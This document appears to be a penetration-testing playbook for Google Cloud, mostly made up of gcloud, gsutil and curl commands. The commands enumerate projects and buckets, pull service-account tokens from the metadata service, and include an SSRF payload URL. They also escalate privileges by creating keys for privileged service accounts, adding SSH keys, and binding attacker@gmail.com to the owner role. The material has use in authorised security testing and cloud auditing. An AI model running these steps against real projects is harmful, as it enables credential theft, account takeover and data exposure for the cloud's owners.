# GCP — Recon, IAM, GCS, Compute Metadata

## When this applies

- You have GCP credentials or are testing a GCP-hosted target.
- Goal: enumerate projects/resources, audit IAM, exfiltrate from GCS, exploit metadata service.

## Technique

`gcloud auth login`, then enumerate per service. Test bucket permissions with `gsutil`. Exploit IAM via service-account impersonation (`actAs`, `keys create`).

## Steps

### gcloud CLI enumeration

```bash
# Authenticate
gcloud auth login

# List projects
gcloud projects list

# Set active project
gcloud config set project project-id

# Get current configuration
gcloud config list

# List compute instances
gcloud compute instances list

# List storage buckets
gsutil ls

# Check bucket permissions
gsutil iam get gs://bucket-name

# List bucket contents
gsutil ls gs://bucket-name

# List firewall rules
gcloud compute firewall-rules list

# Show firewall rule details
gcloud compute firewall-rules describe rule-name

# List IAM policies
gcloud projects get-iam-policy project-id

# List service accounts
gcloud iam service-accounts list

# List service account keys
gcloud iam service-accounts keys list --iam-account=sa@project.iam.gserviceaccount.com
```

### GCS bucket testing

```bash
# Test anonymous access
gsutil ls gs://bucket-name/

# Download from public bucket
gsutil cp gs://bucket-name/file.txt .

# Test write access
gsutil cp test.txt gs://bucket-name/test.txt

# Make object public (if permissions allow)
gsutil acl ch -u AllUsers:R gs://bucket-name/file.txt

# Enumerate buckets
for name in company-backups company-data company-files; do
  gsutil ls gs://$name 2>&1
done
```

### Compute instance metadata (from compromised instance / SSRF)

```bash
# Access metadata
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true" \
  -H "Metadata-Flavor: Google"

# Get service account token
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Get service account email
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
  -H "Metadata-Flavor: Google"

# Use in SSRF attacks
# If application makes HTTP requests based on user input:
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### IAM privilege escalation paths

```bash
# 1. iam.serviceAccounts.actAs
gcloud iam service-accounts keys create key.json \
  --iam-account=privileged-sa@project.iam.gserviceaccount.com

# 2. iam.serviceAccountKeys.create
gcloud iam service-accounts keys create newkey.json \
  --iam-account=target-sa@project.iam.gserviceaccount.com

# 3. compute.instances.setMetadata (add SSH keys)
gcloud compute instances add-metadata instance-name \
  --metadata-from-file ssh-keys=keys.txt

# 4. cloudfunctions.functions.setIamPolicy
gcloud functions add-iam-policy-binding function-name \
  --member=user:attacker@gmail.com \
  --role=roles/cloudfunctions.invoker

# 5. resourcemanager.projects.setIamPolicy
gcloud projects add-iam-policy-binding project-id \
  --member=user:attacker@gmail.com \
  --role=roles/owner
```

### ScoutSuite for GCP

```bash
# Run GCP audit
scout gcp --user-account

# Or with service account
scout gcp --service-account key.json

# View report
# Open scoutsuite-report/scoutsuite_results_gcp.html
```

## Verifying success

- `gcloud projects list` returns project IDs.
- `gsutil cp gs://bucket/file .` succeeds with anonymous credentials.
- Metadata endpoint returns service-account token.

## Common pitfalls

- GCP requires `Metadata-Flavor: Google` header — without it, requests fail.
- Some buckets require Uniform Bucket-Level Access — ACL changes don't apply.
- GKE workloads may use Workload Identity — token format differs from raw SA token.

## Tools

- gcloud CLI, gsutil
- GCPBucketBrute, CloudMapper, Forseti Security
- ScoutSuite (multi-cloud)
- IAM Privilege Escalation Scanner
